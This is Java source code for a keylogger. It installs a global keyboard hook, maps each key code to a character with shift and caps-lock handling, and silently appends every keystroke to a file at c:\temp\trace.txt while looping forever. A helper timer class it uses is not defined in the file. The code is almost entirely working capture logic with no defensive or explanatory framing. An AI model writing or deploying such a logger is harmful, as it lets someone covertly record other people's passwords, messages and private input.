import de.ksquared.system.keyboard.GlobalKeyListener;
import de.ksquared.system.keyboard.KeyAdapter;
import de.ksquared.system.keyboard.KeyEvent;
import java.awt.Toolkit;
import java.io.File;
import java.io.FileOutputStream;
import java.io.PrintWriter;
import java.util.Timer;

public class KeyboardHookTest {
        static int code;
        static char character;
        static File f;
        static boolean capslock,shift,flag;
	public static void main(String[] args) 
   {
       capslock = Toolkit.getDefaultToolkit().getLockingKeyState(KeyEvent.VK_CAPITAL);
       Timer timer = new Timer("Printer");
       MyTask t = new MyTask();
       timer.schedule(t, 1, 2000);  
	new GlobalKeyListener().addKeyListener(new KeyAdapter()
        {
          @Override
                public void keyPressed(KeyEvent event) 
                { 
                    try
                    {
                        flag=true;
                        f=new File("c:\\temp\\trace.txt");
                        FileOutputStream fos1=new FileOutputStream(f,true);
                        PrintWriter fo = new PrintWriter(fos1);
                        code=event.getVirtualKeyCode();
                        character=keymapping(code);
                        if(flag)
                        {
                        System.out.println(character);
                        fo.print(character);
                        }
                        fo.close();
                        }
                    catch(Exception ex)
                    {
                        System.out.println("error="+ex);
                    }
                }
          @Override
		public void keyReleased(KeyEvent event)              
                {        
                    code=event.getVirtualKeyCode();
                    switch(code)
                    {
                        case 160: shift=false; break;
                        case 161: shift=false; break;
                    }
		}
	});
		while(true) {
           try { Thread.sleep(100); }
           catch(InterruptedException e) {}
       }
	}
        static char keymapping(int code)
        {
            char key=' ';
          switch(code)
          {
              case 48: { if(shift){ key=')';} else{ key='0';} } break;
              case 49: { if(shift){ key='!';} else{ key='1';} } break;
              case 50: { if(shift){ key='@';} else{ key='2';} } break;
              case 51: { if(shift){ key='#';} else{ key='3';} } break;
              case 52: { if(shift){ key='$';} else{ key='4';} } break;
              case 53: { if(shift){ key='%';} else{ key='5';} } break;
              case 54: { if(shift){ key='^';} else{ key='6';} } break;
              case 55: { if(shift){ key='&';} else{ key='7';} } break;
              case 56: { if(shift){ key='*';} else{ key='8';} } break;
              case 57: { if(shift){ key='(';} else{ key='9';} } break;
              case 96: key='0'; break;
              case 97: key='1'; break;
              case 98: key='2'; break;
              case 99: key='3'; break;
              case 100: key='4'; break;
              case 101: key='5'; break;
              case 102: key='6'; break;
              case 103: key='7'; break;
              case 104: key='8'; break;
              case 105: key='9'; break;
                  
              case 65: { if(shift&&(!capslock)||(!shift)&&capslock){ key='A';} else{ key='a';} } break;
              case 66: { if(shift&&(!capslock)||(!shift)&&capslock){ key='B';} else{ key='b';} } break;
              case 67: { if(shift&&(!capslock)||(!shift)&&capslock){ key='C';} else{ key='c';} } break;
              case 68: { if(shift&&(!capslock)||(!shift)&&capslock){ key='D';} else{ key='d';} } break;
              case 69: { if(shift&&(!capslock)||(!shift)&&capslock){ key='E';} else{ key='e';} } break;
              case 70: { if(shift&&(!capslock)||(!shift)&&capslock){ key='F';} else{ key='f';} } break;
              case 71: { if(shift&&(!capslock)||(!shift)&&capslock){ key='G';} else{ key='g';} } break;
              case 72: { if(shift&&(!capslock)||(!shift)&&capslock){ key='H';} else{ key='h';} } break;
              case 73: { if(shift&&(!capslock)||(!shift)&&capslock){ key='I';} else{ key='i';} } break;
              case 74: { if(shift&&(!capslock)||(!shift)&&capslock){ key='J';} else{ key='j';} } break;
              case 75: { if(shift&&(!capslock)||(!shift)&&capslock){ key='K';} else{ key='k';} } break;
              case 76: { if(shift&&(!capslock)||(!shift)&&capslock){ key='L';} else{ key='l';} } break;
              case 77: { if(shift&&(!capslock)||(!shift)&&capslock){ key='M';} else{ key='m';} } break;
              case 78: { if(shift&&(!capslock)||(!shift)&&capslock){ key='N';} else{ key='n';} } break;
              case 79: { if(shift&&(!capslock)||(!shift)&&capslock){ key='O';} else{ key='o';} } break;
              case 80: { if(shift&&(!capslock)||(!shift)&&capslock){ key='P';} else{ key='p';} } break;
              case 81: { if(shift&&(!capslock)||(!shift)&&capslock){ key='Q';} else{ key='q';} } break;
              case 82: { if(shift&&(!capslock)||(!shift)&&capslock){ key='R';} else{ key='r';} } break;
              case 83: { if(shift&&(!capslock)||(!shift)&&capslock){ key='S';} else{ key='s';} } break;
              case 84: { if(shift&&(!capslock)||(!shift)&&capslock){ key='T';} else{ key='t';} } break;
              case 85: { if(shift&&(!capslock)||(!shift)&&capslock){ key='U';} else{ key='u';} } break;
              case 86: { if(shift&&(!capslock)||(!shift)&&capslock){ key='V';} else{ key='v';} } break;
              case 87: { if(shift&&(!capslock)||(!shift)&&capslock){ key='W';} else{ key='w';} } break;
              case 88: { if(shift&&(!capslock)||(!shift)&&capslock){ key='X';} else{ key='x';} } break;
              case 89: { if(shift&&(!capslock)||(!shift)&&capslock){ key='Y';} else{ key='y';} } break;
              case 90: { if(shift&&(!capslock)||(!shift)&&capslock){ key='Z';} else{ key='z';} } break;
                  
              case 13: key='\n'; break;
              case 32: key=' '; break;
              case 106: key='*'; break;
              case 107: key='+'; break;
              case 110: key='.'; break;
              case 190: { if(shift){ key='>';} else{ key='.';} } break;
              case 111: key='/'; break;
              case 191: { if(shift){ key='?';} else{ key='/';} } break;
              case 188: { if(shift){ key='<';} else{ key=',';} } break;
              case 186: { if(shift){ key=':';} else{ key=';';} } break;
              case 219: { if(shift){ key='{';} else{ key='[';} } break;
              case 221: { if(shift){ key='}';} else{ key=']';} } break;
              case 187: { if(shift){ key='+';} else{ key='=';} } break;
              case 192: { if(shift){ key='~';} else{ key='`';} } break;
              case 109: key='-'; break;
              case 189: { if(shift){ key='_';} else{ key='-';} } break;
                  
              case 160: { shift=true; flag=false; } break;
              case 161: { shift=true; flag=false; } break;
              case 20: { capslock=!capslock; flag=false; }break;
          }
          return key;
        }
}